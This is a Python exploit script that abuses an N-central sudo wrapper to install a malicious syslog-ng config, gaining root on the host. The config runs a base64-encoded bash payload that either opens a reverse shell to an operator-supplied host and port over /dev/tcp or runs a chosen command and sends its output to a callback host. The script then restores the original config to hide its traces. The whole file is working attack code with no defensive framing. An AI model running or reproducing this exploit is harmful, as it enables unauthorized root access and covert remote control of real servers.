#!/usr/bin/env python3
import argparse
import base64
import os
import shutil
import stat
import subprocess
import time
from pathlib import Path


def main():
    p = argparse.ArgumentParser(description="N-central nable-to-root syslog installer exploit")
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--callback-port", type=int, default=9003)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")
    if reverse:
        effect = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
    else:
        command64 = base64.b64encode(a.command.encode()).decode()
        effect = (
            f"out=$(echo {command64}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};printf '%s\\n' \"$out\" >&3;exec 3>&-"
        )
    installed = Path("/etc/syslog-ng/conf.d/ncod_network.conf")
    original = installed.read_bytes() if installed.exists() else None
    if original is None:
        restore = "rm -f /etc/syslog-ng/conf.d/ncod_network.conf"
    else:
        info = installed.stat()
        original64 = base64.b64encode(original).decode()
        restore = (
            f"echo {original64}|base64 -d >/etc/syslog-ng/conf.d/ncod_network.conf;"
            f"chown {info.st_uid}:{info.st_gid} /etc/syslog-ng/conf.d/ncod_network.conf;"
            f"chmod {stat.S_IMODE(info.st_mode):o} /etc/syslog-ng/conf.d/ncod_network.conf"
        )
    pem_hash = subprocess.check_output(
        ["openssl", "x509", "-noout", "-hash", "-in", "/etc/pki/tls/certs/ca-bundle.crt"],
        text=True,
    ).strip()
    shell = (
        "exec 9>/run/syslog-restore.lock;flock -n 9||exit 0;"
        + effect
        + ";"
        + restore
        + f";rm -f /etc/syslog-ng/conf.d/ca.pem /etc/syslog-ng/conf.d/{pem_hash}.0;"
        "systemctl restart syslog-ng.service;rm -f /run/syslog-restore.lock"
    )
    encoded = base64.b64encode(shell.encode()).decode()
    config = (
        'source s_input { file("/var/log/n-central/dmsservice_apiaudit.log", flags(no-parse)); };\n'
        'destination d_exec { program("/bin/bash -c \\\"echo '
        + encoded
        + '|base64 -d|/bin/bash\\\""); };\n'
        'log { source(s_input); destination(d_exec); };\n'
    )
    stage = Path("/var/opt/n-central/tmp/syslog")
    stage.mkdir(parents=True, exist_ok=True)
    path = stage / "ncod_network.conf"
    path.write_text(config)
    path.chmod(0o644)
    shutil.copyfile("/etc/pki/tls/certs/ca-bundle.crt", stage / "ca.pem")
    (stage / "ca.pem").chmod(0o644)
    result = subprocess.run(
        ["sudo", "/opt/nable/usr/sbin/nable_wrapper.pl", "installSyslogConfig"],
        text=True,
        capture_output=True,
    )
    print(f"uid={os.geteuid()}")
    print(f"wrapper={result.returncode}")
    for _ in range(60):
        current = installed.read_bytes() if installed.exists() else None
        if current == original and not stage.exists():
            print("cleanup=ok")
            break
        time.sleep(0.25)
    if result.stderr.strip():
        print(result.stderr.strip())


if __name__ == "__main__":
    main()
